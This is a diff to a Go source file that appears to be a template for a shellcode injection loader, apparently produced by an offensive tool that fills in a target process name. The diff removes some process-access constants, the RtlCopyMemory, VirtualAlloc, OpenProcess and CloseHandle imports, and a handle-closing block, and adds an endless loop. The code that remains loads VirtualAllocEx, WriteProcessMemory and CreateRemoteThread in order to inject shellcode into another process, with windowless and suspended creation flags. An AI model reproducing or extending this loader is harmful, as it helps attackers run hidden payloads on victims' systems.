@@ -23,11 +23,6 @@ const (
     PAGE_READWRITE            = 0x4
     PAGE_EXECUTE_READ         = 0x20
     PAGE_EXECUTE_READWRITE    = 0x40
-    PROCESS_CREATE_THREAD     = 0x0002
-    PROCESS_QUERY_INFORMATION = 0x0400
-    PROCESS_VM_OPERATION      = 0x0008
-    PROCESS_VM_WRITE          = 0x0020
-    PROCESS_VM_READ           = 0x0010
     CREATE_SUSPENDED          = 0x4
     CREATE_NO_WINDOW          = 0x8000000
 )
@@ -36,15 +31,10 @@ var (
     kernel32            = syscall.MustLoadDLL("kernel32.dll")
     ntdll               = syscall.MustLoadDLL("ntdll.dll")
 
-    RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
-
-    VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
     VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
     VirtualProtectEx    = kernel32.MustFindProc("VirtualProtectEx")
     WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
-    OpenProcess         = kernel32.MustFindProc("OpenProcess")
     CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
-    closeHandle         = kernel32.MustFindProc("CloseHandle")
 )
 
 
@@ -141,11 +131,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         os.Exit(1)
     }
 
-    /* close process handler */
-    _, _, err = closeHandle.Call(uintptr(process.Process))
-    if err.Error() != "The operation completed successfully." {
-        os.Exit(1)
-    }
+    for {}
 }
     `, targetProcess)
 }
